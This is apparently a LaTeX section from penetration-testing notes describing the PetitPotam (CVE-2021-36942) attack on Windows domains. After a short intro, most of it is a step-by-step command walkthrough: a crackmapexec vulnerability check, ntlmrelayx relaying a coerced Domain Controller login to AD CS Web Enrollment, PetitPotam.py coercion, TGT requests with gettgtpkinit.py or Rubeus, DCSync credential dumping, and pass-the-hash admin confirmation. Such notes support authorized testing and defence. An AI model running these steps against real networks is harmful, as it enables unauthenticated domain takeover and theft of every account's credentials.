\section{PetitPotam (MS-EFSRPC)}

\subsection{Intro}

PetitPotam (CVE-2021-36942) is an LSA spoofing vulnerability that was patched
in August of 2021. The flaw allows an unauthenticated attacker to coerce a
Domain Controller to authenticate against another host using NTLM over port 445
via the
\href{https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-lsad/1b5471ef-4c33-4a91-b079-dfcbb82f05cc}{Local
Security Authority Remote Protocol (LSARPC)} by abusing Microsoftâ€™s
\href{https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31}{Encrypting
File System Remote Protocol (MS-EFSRPC)}. This technique allows an
unauthenticated attacker to take over a Windows domain where
\href{https://docs.microsoft.com/en-us/learn/modules/implement-manage-active-directory-certificate-services/2-explore-fundamentals-of-pki-ad-cs}{Active
Directory Certificate Services (AD CS)} is in use. 

In the attack, an authentication request from the targeted Domain Controller is
relayed to the Certificate Authority (CA) host's Web Enrollment page and makes
a Certificate Signing Request (CSR) for a new digital certificate. This
certificate can then be used with a tool such as Rubeus or gettgtpkinit.py from
PKINITtools to request a TGT for the Domain Controller, which can then be used
to achieve domain compromise via a DCSync attack~\ref{kerberos:DCSync}.

\href{https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/}{This blog
post} goes into more detail on NTLM relaying to AD CS and the PetitPotam attack.

\subsection{Vuln check}

\begin{verbatim}
$ proxychains4 -q crackmapexec smb 172.16.10.3 -M PetitPotam
\end{verbatim}

\subsection{Exploit}
\begin{itemize}
    \item  start \verb+ntlmrelayx.py+ on the attack host, specifying the Web
        Enrollment URL for the CA host and using either the
        KerberosAuthentication or DomainController AD CS template (use 
        \href{https://github.com/zer1t0/certi}{certi} to find the URL of the
    CA):
\begin{verbatim}
sudo ntlmrelayx.py -debug -smb2support \
    --target http://CA_FQDN/certsrv/certfnsh.asp \
    --adcs --template DomainController
\end{verbatim}
    \item run \href{https://github.com/topotam/PetitPotam}{PotitPotam.py} to
        attempt to coerce the Domain Controller to authenticate to ths
        attacker:
\begin{verbatim}
python3 PetitPotam.py ATTACK_IP DC_IP
\end{verbatim}
    \item \verb+ntlmrelayx.py+ Catch the  Base64 Encoded Certificate for DC
    \item Requesting a TGT Using \verb+gettgtpkinit.py+:
\begin{verbatim}
python3 /opt/PKINITtools/gettgtpkinit.py DOMAIN.NAME/DC-NAME\$ \
    -pfx-base64 $BASE64_CERTIFICATE    dc.ccache
\end{verbatim}

    \item Setting the \verb+KRB5CCNAME+ Environment Variable:
\begin{verbatim}
export KRB5CCNAME=dc.ccache
\end{verbatim}

    \item Using Domain Controller TGT to DCSync with \verb+secretsdump.py+~\ref{tool:impacket:secretsdump:remote:NTDS}
    \item validate with \verb+klist+ from \verb+krb5-user+ package.
    \item Confirming Admin Access to the Domain Controller:
\begin{verbatim}
crackmapexec smb DC_IP -u administrator -H NT_HASH 
\end{verbatim}
\end{itemize}

\subsection{Using Rubeus}
After getting the TGT 
\begin{enumerate}
    \item use Reubus it is possible to use Reubus:
\begin{verbatim}
.\Rubeus.exe asktgt /user:DC_NAME$ /certificate BASE64_CERTIF /ptt
\end{verbatim}

    \item Confirming the Ticket is in Memory with \verb+klist+
    \item DCSync with mimikatz~\ref{tool:mimikatz:cred-dumping}
\end{enumerate}
